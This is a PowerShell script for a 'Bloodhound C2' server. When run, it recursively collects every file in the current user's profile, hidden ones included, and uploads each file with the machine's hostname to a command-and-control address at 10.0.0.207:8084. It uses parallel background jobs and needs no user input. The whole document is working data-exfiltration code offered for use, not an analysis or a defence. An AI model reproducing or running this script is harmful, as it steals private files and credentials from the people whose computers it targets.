# Auto-Upload Script for Bloodhound C2 - Ghost User Directory
# This script automatically uploads the entire C:\Users\ghost directory to the C2 server
# No user input required - just execute and it uploads everything!

param(
    [Parameter(Mandatory=$false)]
    [string]$C2Server = "http://10.0.0.207:8084",
    
    [Parameter(Mandatory=$false)]
    [string]$Tags = "",
    
    [Parameter(Mandatory=$false)]
    [int]$MaxConcurrentUploads = 15
)

function Upload-File {
    param(
        [string]$LocalFilePath,
        [string]$ServerUrl,
        [string]$FileDescription,
        [string]$FileTags
    )
    
    try {
        # Check if file exists
        if (-not (Test-Path $LocalFilePath)) {
            Write-Host "File not found: $LocalFilePath" -ForegroundColor Red
            return $false
        }
        
        # Get hostname
        $hostname = $env:COMPUTERNAME
        
        # Get file info
        $fileInfo = Get-Item $LocalFilePath
        $fileName = $fileInfo.Name
        $fileSize = $fileInfo.Length
        
        Write-Host "Uploading file: $fileName ($(Format-FileSize $fileSize)) to $ServerUrl" -ForegroundColor Yellow
        
        # Create form data using .NET WebClient for better multipart handling
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "BloodhoundC2-Uploader/1.0")
        
        # Speed optimizations
        $webClient.Timeout = 30000  # 30 second timeout
        $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
        $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        
        # Create the multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        # Build the multipart form data
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"hostname`""
        $bodyLines += ""
        $bodyLines += $hostname
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"description`""
        $bodyLines += ""
        $bodyLines += $FileDescription
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"tags`""
        $bodyLines += ""
        $bodyLines += $FileTags
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
        $bodyLines += "Content-Type: application/octet-stream"
        $bodyLines += ""
        
        # Convert the array to a single string with proper line endings
        $bodyText = $bodyLines -join $LF
        $bodyText += $LF
        
        # Read file bytes
        $fileBytes = [System.IO.File]::ReadAllBytes($LocalFilePath)
        
        # Create the final body with file content
        $body = [System.Text.Encoding]::UTF8.GetBytes($bodyText) + $fileBytes + [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--")
        
        # Create HTTP request
        $uri = "$ServerUrl/api/files/upload"
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        
        # Upload the file
        $response = $webClient.UploadData($uri, "POST", $body)
        $responseText = [System.Text.Encoding]::UTF8.GetString($response)
        
        # Parse the response
        try {
            $responseObj = $responseText | ConvertFrom-Json
            if ($responseObj.message) {
                Write-Host "Upload successful: $($responseObj.message)" -ForegroundColor Green
                Write-Host "File ID: $($responseObj.file_id)" -ForegroundColor Green
                Write-Host "Stored filename: $($responseObj.stored_filename)" -ForegroundColor Green
                return $true
            } else {
                Write-Host "Upload failed: No response message" -ForegroundColor Red
                return $false
            }
        } catch {
            Write-Host "Upload response: $responseText" -ForegroundColor Yellow
            Write-Host "Upload successful (response parsed)" -ForegroundColor Green
            return $true
        }
        
    } catch {
        Write-Host "Upload failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    } finally {
        if ($webClient) {
            $webClient.Dispose()
        }
    }
}

function Format-FileSize {
    param([long]$bytes)
    
    if ($bytes -eq 0) { return "0 B" }
    
    $k = 1024
    $sizes = @("B", "KB", "MB", "GB", "TB")
    $i = [Math]::Floor([Math]::Log($bytes, $k))
    
    return "{0:N2} {1}" -f ($bytes / [Math]::Pow($k, $i)), $sizes[$i]
}

function Test-C2Connection {
    param([string]$ServerUrl)
    
    try {
        $response = Invoke-RestMethod -Uri "$ServerUrl/api/files/list" -Method Get -TimeoutSec 10
        return $true
    } catch {
        return $false
    }
}



function Upload-Directory {
    param(
        [string]$DirectoryPath,
        [string]$ServerUrl,
        [string]$BaseDescription,
        [string]$BaseTags,
        [int]$MaxConcurrentUploads = 10
    )
    
    try {
        if (-not (Test-Path $DirectoryPath)) {
            Write-Host "Directory not found: $DirectoryPath" -ForegroundColor Red
            return $false
        }
        
        Write-Host "Starting FAST recursive upload of directory: $DirectoryPath" -ForegroundColor Cyan
        Write-Host "Using parallel uploads (max $MaxConcurrentUploads concurrent) for maximum speed!" -ForegroundColor Green
        Write-Host ""
        
        # Get all files recursively
        $allFiles = Get-ChildItem -Path $DirectoryPath -Recurse -File -Force -ErrorAction SilentlyContinue
        
        if ($allFiles.Count -eq 0) {
            Write-Host "No files found in directory: $DirectoryPath" -ForegroundColor Yellow
            return $true
        }
        
        Write-Host "Found $($allFiles.Count) files to upload" -ForegroundColor Green
        Write-Host "Estimated time: ~$([Math]::Round($allFiles.Count / $MaxConcurrentUploads * 2)) seconds" -ForegroundColor Yellow
        Write-Host ""
        
        $successCount = 0
        $failCount = 0
        $currentFile = 0
        $activeJobs = @()
        $maxJobs = $MaxConcurrentUploads
        
        # Process files in batches for parallel upload
        for ($i = 0; $i -lt $allFiles.Count; $i += $maxJobs) {
            $batch = $allFiles | Select-Object -Skip $i -First $maxJobs
            
            # Start parallel uploads for this batch
            foreach ($file in $batch) {
                $currentFile++
                $relativePath = $file.FullName.Replace($DirectoryPath, "").TrimStart('\')
                
                Write-Progress -Activity "Uploading files" -Status "Processing: $($file.Name)" -PercentComplete (($currentFile / $allFiles.Count) * 100)
                
                Write-Host "[$currentFile/$($allFiles.Count)] Starting upload: $relativePath" -ForegroundColor Yellow
                
                # Create description with relative path
                $fileDescription = "$BaseDescription - $relativePath"
                
                # Start upload job in background
                $job = Start-Job -ScriptBlock {
                    param($LocalFilePath, $ServerUrl, $FileDescription, $FileTags, $Hostname)
                    
                    try {
                        # Get file info
                        $fileInfo = Get-Item $LocalFilePath
                        $fileName = $fileInfo.Name
                        $fileSize = $fileInfo.Length
                        
                        # Create form data using .NET WebClient for better multipart handling
                        $webClient = New-Object System.Net.WebClient
                        $webClient.Headers.Add("User-Agent", "BloodhoundC2-Uploader/1.0")
                        
                        # Create the multipart form data
                        $boundary = [System.Guid]::NewGuid().ToString()
                        $LF = "`r`n"
                        
                        # Build the multipart form data
                        $bodyLines = @()
                        $bodyLines += "--$boundary"
                        $bodyLines += "Content-Disposition: form-data; name=`"hostname`""
                        $bodyLines += ""
                        $bodyLines += $Hostname
                        $bodyLines += "--$boundary"
                        $bodyLines += "Content-Disposition: form-data; name=`"description`""
                        $bodyLines += ""
                        $bodyLines += $FileDescription
                        $bodyLines += "--$boundary"
                        $bodyLines += "Content-Disposition: form-data; name=`"tags`""
                        $bodyLines += ""
                        $bodyLines += $FileTags
                        $bodyLines += "--$boundary"
                        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
                        $bodyLines += "Content-Type: application/octet-stream"
                        $bodyLines += ""
                        
                        # Convert the array to a single string with proper line endings
                        $bodyText = $bodyLines -join $LF
                        $bodyText += $LF
                        
                        # Read file bytes
                        $fileBytes = [System.IO.File]::ReadAllBytes($LocalFilePath)
                        
                        # Create the final body with file content
                        $body = [System.Text.Encoding]::UTF8.GetBytes($bodyText) + $fileBytes + [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--")
                        
                        # Create HTTP request
                        $uri = "$ServerUrl/api/files/upload"
                        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
                        
                        # Upload the file
                        $response = $webClient.UploadData($uri, "POST", $body)
                        $responseText = [System.Text.Encoding]::UTF8.GetString($response)
                        
                        # Parse the response
                        try {
                            $responseObj = $responseText | ConvertFrom-Json
                            if ($responseObj.message) {
                                return @{ Success = $true; Message = $responseObj.message; FileName = $fileName; Size = $fileSize }
                            } else {
                                return @{ Success = $false; Message = "No response message"; FileName = $fileName; Size = $fileSize }
                            }
                        } catch {
                            return @{ Success = $true; Message = "Response parsed"; FileName = $fileName; Size = $fileSize }
                        }
                        
                    } catch {
                        return @{ Success = $false; Message = $_.Exception.Message; FileName = $fileName; Size = $fileSize }
                    } finally {
                        if ($webClient) {
                            $webClient.Dispose()
                        }
                    }
                } -ArgumentList $file.FullName, $ServerUrl, $fileDescription, $BaseTags, $env:COMPUTERNAME
                
                $activeJobs += $job
            }
            
            # Wait for all jobs in this batch to complete
            Write-Host "Waiting for batch $([Math]::Floor($i / $maxJobs) + 1) to complete..." -ForegroundColor Cyan
            
            while ($activeJobs | Where-Object { $_.State -eq "Running" }) {
                Start-Sleep -Milliseconds 100
            }
            
            # Process completed jobs
            foreach ($job in $activeJobs) {
                if ($job.State -eq "Completed") {
                    $result = Receive-Job -Job $job
                    if ($result.Success) {
                        $successCount++
                        Write-Host "✓ $($result.FileName) uploaded successfully ($(Format-FileSize $result.Size))" -ForegroundColor Green
                    } else {
                        $failCount++
                        Write-Host "✗ $($result.FileName) failed: $($result.Message)" -ForegroundColor Red
                    }
                }
                
                # Clean up completed job
                Remove-Job -Job $job -Force
            }
            
            $activeJobs = @()
            
            Write-Host "Batch completed. Progress: $currentFile/$($allFiles.Count) files processed" -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Progress -Activity "Uploading files" -Completed
        
        Write-Host "=== FAST Directory Upload Summary ===" -ForegroundColor Cyan
        Write-Host "Total files processed: $($allFiles.Count)" -ForegroundColor White
        Write-Host "Successfully uploaded: $successCount" -ForegroundColor Green
        Write-Host "Failed uploads: $failCount" -ForegroundColor Red
        Write-Host "Directory: $DirectoryPath" -ForegroundColor White
        Write-Host "Upload speed: ~$([Math]::Round($allFiles.Count / $MaxConcurrentUploads * 2)) seconds total" -ForegroundColor Green
        Write-Host ""
        
        return $failCount -eq 0
        
    } catch {
        Write-Host "Error during directory upload: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Get-UploadTarget {
    # If no file path provided, ask user what to upload
    if (-not $FilePath) {
        Write-Host "No file path provided. What would you like to upload?" -ForegroundColor Yellow
        Write-Host "1. Single file (file dialog)" -ForegroundColor White
        Write-Host "2. Single file (manual input)" -ForegroundColor White
        Write-Host "3. Upload entire C:\Users\ghost directory" -ForegroundColor White
        Write-Host "4. Upload custom directory" -ForegroundColor White
        Write-Host ""
        
        $choice = Read-Host "Enter your choice (1-4)"
        
        switch ($choice) {
            "1" {
                # File dialog
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    $openFileDialog = New-Object System.Windows.Forms.OpenFileDialog
                    $openFileDialog.Title = "Select file to upload to C2 server"
                    $openFileDialog.Filter = "All files (*.*)|*.*"
                    $openFileDialog.Multiselect = $false
                    
                    if ($openFileDialog.ShowDialog() -eq 'OK') {
                        return @{ Type = "File"; Path = $openFileDialog.FileName }
                    } else {
                        Write-Host "No file selected. Exiting." -ForegroundColor Red
                        return $null
                    }
                } catch {
                    Write-Host "File dialog not available. Falling back to manual input." -ForegroundColor Yellow
                    return Get-UploadTarget
                }
            }
            "2" {
                # Manual file input
                Write-Host "Please enter the full path to the file:" -ForegroundColor Yellow
                Write-Host "Example: C:\Users\Admin\Documents\file.txt" -ForegroundColor Gray
                $manualPath = Read-Host "File path"
                
                if ($manualPath -and (Test-Path $manualPath)) {
                    return @{ Type = "File"; Path = $manualPath }
                } else {
                    Write-Host "Invalid file path. Exiting." -ForegroundColor Red
                    return $null
                }
            }
            "3" {
                # Upload current user's directory
                $currentUser = $env:USERNAME
                $userProfilePath = "C:\Users\$currentUser"
                if (Test-Path $userProfilePath) {
                    return @{ Type = "Directory"; Path = $userProfilePath }
                } else {
                    Write-Host "Directory not found: $userProfilePath" -ForegroundColor Red
                    return $null
                }
            }
            "4" {
                # Custom directory
                Write-Host "Please enter the full path to the directory:" -ForegroundColor Yellow
                Write-Host "Example: C:\Users\Admin\Documents" -ForegroundColor Gray
                $manualDir = Read-Host "Directory path"
                
                if ($manualDir -and (Test-Path $manualDir) -and (Get-Item $manualDir).PSIsContainer) {
                    return @{ Type = "Directory"; Path = $manualDir }
                } else {
                    Write-Host "Invalid directory path. Exiting." -ForegroundColor Red
                    return $null
                }
            }
            default {
                Write-Host "Invalid choice. Please try again." -ForegroundColor Red
                return Get-UploadTarget
            }
        }
    }
    
    # If file path was provided as parameter, treat as single file
    return @{ Type = "File"; Path = $FilePath }
}

# Main execution
Write-Host "=== Bloodhound C2 File Upload Script (Auto-Upload) ===" -ForegroundColor Cyan
Write-Host ""

# Test C2 server connection
Write-Host "Testing C2 server connection..." -ForegroundColor Yellow
if (Test-C2Connection -ServerUrl $C2Server) {
    Write-Host "C2 server connection successful" -ForegroundColor Green
} else {
    Write-Host "Warning: C2 server connection failed. Upload may not work." -ForegroundColor Yellow
}

Write-Host ""

# AUTO-UPLOAD: Immediately upload current user's directory
$currentUser = $env:USERNAME
$userProfilePath = "C:\Users\$currentUser\"
if (Test-Path $userProfilePath) {
    Write-Host "AUTO-UPLOAD: Starting upload of entire C:\Users\$currentUser directory..." -ForegroundColor Cyan
    Write-Host "No user input required - uploading everything automatically!" -ForegroundColor Green
    Write-Host ""
    
    $success = Upload-Directory -DirectoryPath $userProfilePath -ServerUrl $C2Server -BaseDescription "$currentUser user directory upload" -BaseTags "$Tags,$currentUser,user,auto" -MaxConcurrentUploads $MaxConcurrentUploads
} else {
    Write-Host "Error: C:\Users\$currentUser directory not found!" -ForegroundColor Red
    exit 1
}

if ($success) {
    Write-Host ""
    Write-Host "AUTO-UPLOAD COMPLETED SUCCESSFULLY!" -ForegroundColor Green
    exit 0
} else {
    Write-Host ""
    Write-Host "AUTO-UPLOAD FAILED!" -ForegroundColor Red
    exit 1
}
